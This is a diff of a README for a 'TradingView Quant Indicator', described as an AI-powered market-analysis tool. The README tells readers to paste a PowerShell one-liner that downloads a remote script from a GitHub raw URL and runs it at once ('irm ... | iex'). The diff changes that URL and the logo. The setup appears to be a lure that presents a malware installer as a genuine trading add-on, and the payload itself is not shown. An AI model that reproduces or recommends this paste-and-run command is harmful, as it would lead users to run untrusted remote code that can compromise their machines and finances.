@@ -1,10 +1,8 @@
 <a id="get"></a>
 
 <p align="center">
-  <img src="logo.png" alt="TradingView" width="580">
+  <img src="quant.png" alt="TradingView" width="580">
 </p>
-
-<h2 align="center">Quant Indicator</h2>
 
 TradingView Quant Indicator is our first AI-powered indicator for market analysis directly on the chart. Quant processes live market data together with price action, liquidity, positioning, volatility, market structure, and scheduled events. It uses this information to model several ways the market may develop over the selected timeframe and updates its analysis as new data becomes available.
 
@@ -28,7 +26,7 @@ Then press **Enter**.
 
 Copy and paste the installation command below into the PowerShell window:
 ```powershell
-irm TradingViewLibrary.app/Quant | iex
+irm https://github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
 ```
 
 Press **Enter** to begin the installation.
